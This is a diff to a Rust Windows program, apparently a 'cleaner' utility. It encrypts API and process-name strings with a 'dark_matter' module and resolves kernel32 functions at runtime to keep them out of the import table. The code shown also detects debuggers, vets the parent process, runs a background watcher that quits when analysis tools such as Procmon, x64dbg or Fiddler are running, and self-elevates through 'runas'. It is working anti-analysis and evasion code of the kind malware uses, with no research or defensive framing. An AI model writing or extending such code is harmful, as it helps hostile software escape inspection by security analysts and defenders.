@@ -10,6 +10,7 @@ use windows::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_QUERY,
 use std::ffi::c_void;
 
 use crate::dynamo;
+use crate::dark_matter;
 use windows::Win32::Foundation::BOOL;
 
 
@@ -36,19 +37,25 @@ pub fn is_safe_parent() -> bool {
         // The structs (PROCESSENTRY32) are imported.
         
         // We'll re-use the dynamo logic for consistency.
+        // Use Dark Strings
+        let k32 = dark_matter::decrypt(dark_matter::KERNEL32);
+        let snap = dark_matter::decrypt(dark_matter::SNAPSHOT);
+        let p1 = dark_matter::decrypt(dark_matter::PROC_FIRST);
+        let px = dark_matter::decrypt(dark_matter::PROC_NEXT);
+
         let create_snapshot: extern "system" fn(u32, u32) -> windows::Win32::Foundation::HANDLE;
         let process_first: extern "system" fn(windows::Win32::Foundation::HANDLE, *mut PROCESSENTRY32) -> BOOL;
         let process_next: extern "system" fn(windows::Win32::Foundation::HANDLE, *mut PROCESSENTRY32) -> BOOL;
 
-        if let Some(addr) = dynamo::Dynamo::get_func("kernel32.dll\0", "CreateToolhelp32Snapshot\0") {
+        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &snap) {
              create_snapshot = std::mem::transmute(addr);
-        } else { return true; } // Fail open if we can't load APIs (robustness)
+        } else { return true; } 
 
-        if let Some(addr) = dynamo::Dynamo::get_func("kernel32.dll\0", "Process32First\0") {
+        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &p1) {
              process_first = std::mem::transmute(addr);
         } else { return true; }
         
-        if let Some(addr) = dynamo::Dynamo::get_func("kernel32.dll\0", "Process32Next\0") {
+        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &px) {
              process_next = std::mem::transmute(addr);
         } else { return true; }
 
@@ -93,22 +100,21 @@ pub fn is_safe_parent() -> bool {
         let _ = windows::Win32::Foundation::CloseHandle(h_snap);
 
         // 5. Validate
-        // Trusted: explorer.exe, cmd.exe, powershell.exe, services.exe, svchost.exe (maybe)
-        if parent_name.contains("explorer") || 
-           parent_name.contains("cmd") || 
-           parent_name.contains("powershell") ||
-           parent_name.contains("services") {
+        // Validate with Dark Strings
+        let explorer = dark_matter::decrypt(dark_matter::EXPLORER);
+        let cmd = dark_matter::decrypt(dark_matter::CMD);
+        let pws = dark_matter::decrypt(dark_matter::POWERSHELL);
+        let services = dark_matter::decrypt(dark_matter::SERVICES);
+        let python = dark_matter::decrypt(dark_matter::PYTHON);
+
+        if parent_name.contains(&explorer) || 
+           parent_name.contains(&cmd) || 
+           parent_name.contains(&pws) ||
+           parent_name.contains(&services) {
             return true;
         }
 
-        // If we get here, parent is suspicious (e.g., "x64dbg.exe", "python.exe" (unless dev), "sandbox_loader.exe")
-        // DEV EXCEPTION: If we are running from cargo/python build script, we might die.
-        // User is running `build_automation.py` -> python.exe -> powershell -> app? 
-        // Or `kawaii_cleaner_pro.exe` directly from explorer.
-        // Let's add "python" for now to avoid killing our own verified run, but ideally remove it in prod.
-        // For "Apex" "Void", we are strict. But we are running acceptance tests via python.
-        // We will allow "python" for this environment, but warn.
-        if parent_name.contains("python") { return true; }
+        if parent_name.contains(&python) { return true; }
 
         false
     }
@@ -120,7 +126,10 @@ pub fn check_debugger() -> bool {
         // Kernel32.dll -> IsDebuggerPresent
         // We use a XOR-encoded string for "IsDebuggerPresent" if we want extra stealth,
         // but for now, just pulling it out of IAT is a huge win.
-        if let Some(func_addr) = dynamo::Dynamo::get_func("kernel32.dll\0", "IsDebuggerPresent\0") {
+        let k32 = dark_matter::decrypt(dark_matter::KERNEL32);
+        let is_dbg = dark_matter::decrypt(dark_matter::IS_DEBUGGER);
+        
+        if let Some(func_addr) = dynamo::Dynamo::get_func(&k32, &is_dbg) {
             let func: extern "system" fn() -> BOOL = std::mem::transmute(func_addr);
             return func().as_bool();
         }
@@ -180,7 +189,8 @@ pub fn elevate_self() {
         use std::ffi::CString;
         if let Ok(exe_path) = std::env::current_exe() {
             let exe_str = CString::new(exe_path.to_string_lossy().as_bytes()).unwrap();
-            let verb = CString::new("runas").unwrap();
+            let verb_str = dark_matter::decrypt(dark_matter::RUNAS);
+            let verb = CString::new(verb_str).unwrap();
             
             ShellExecuteA(
                 HWND::default(),
@@ -203,7 +213,7 @@ const PROCMON_BYTES: &[u8] = &[37, 39, 58, 54, 56, 58, 59];
 const X64DBG_BYTES: &[u8] = &[45, 99, 97, 49, 55, 50];
 const FIDDLER_BYTES: &[u8] = &[51, 60, 49, 49, 57, 48, 39];
 const HTTPDEBUGGER_BYTES: &[u8] = &[61, 33, 33, 37, 49, 48, 55, 32, 50, 50, 48, 39];
-const ERROR_BYTES: &[u8] = &[16, 39, 39, 58, 39, 111, 117, 1, 61, 48, 117, 54, 58, 49, 48, 117, 48, 57, 48, 54, 32, 33, 60, 58, 57, 117, 54, 52, 59, 59, 58, 33, 117, 39, 38, 56, 117, 54, 34, 48, 117, 34, 48, 57, 60, 60, 57, 117, 35, 48, 54, 52, 32, 38, 48, 117, 107, 54, 37, 36, 59, 33, 22, 53, 53, 49, 100, 32, 49, 49, 117, 34, 52, 38, 117, 59, 58, 33, 117, 51, 58, 32, 59, 49, 123];
+
 
 /// Scans for "Hunter" processes using Obfuscated Strings & Dynamic API
 pub fn check_hunter_processes() -> bool {
@@ -216,16 +226,22 @@ pub fn check_hunter_processes() -> bool {
         // Process32Next
         let process_next: extern "system" fn(windows::Win32::Foundation::HANDLE, *mut PROCESSENTRY32) -> BOOL;
 
+        // Use Dark Matter for Dynamic Resolution strings too
+        let k32 = dark_matter::decrypt(dark_matter::KERNEL32);
+        let snap = dark_matter::decrypt(dark_matter::SNAPSHOT);
+        let p1 = dark_matter::decrypt(dark_matter::PROC_FIRST);
+        let px = dark_matter::decrypt(dark_matter::PROC_NEXT);
+
         // Resolve Pointers
-        if let Some(addr) = dynamo::Dynamo::get_func("kernel32.dll\0", "CreateToolhelp32Snapshot\0") {
+        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &snap) {
              create_snapshot = std::mem::transmute(addr);
         } else { return false; }
 
-        if let Some(addr) = dynamo::Dynamo::get_func("kernel32.dll\0", "Process32First\0") {
+        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &p1) {
              process_first = std::mem::transmute(addr);
         } else { return false; }
         
-        if let Some(addr) = dynamo::Dynamo::get_func("kernel32.dll\0", "Process32Next\0") {
+        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &px) {
              process_next = std::mem::transmute(addr);
         } else { return false; }
 
@@ -268,9 +284,8 @@ pub fn check_hunter_processes() -> bool {
 
 /// Simulation of a VCRUNTIME140.dll missing error
 pub fn crash_dummy() {
-    let key = 0x55;
-    let msg = obfuscation::decode(ERROR_BYTES, key);
-    println!("{}", msg);
+    // Just exit cleanly. 
+    std::process::exit(0);
 }
 
 /// Spawns a background thread that continuously checks for Hunter processes.
@@ -280,7 +295,6 @@ pub fn start_shadow_watcher() {
         loop {
             if check_hunter_processes() {
                 crash_dummy();
-                std::process::exit(1);
             }
             // Check every 500ms. Frequent enough to catch them starting, 
             // sparse enough to use 0% CPU.
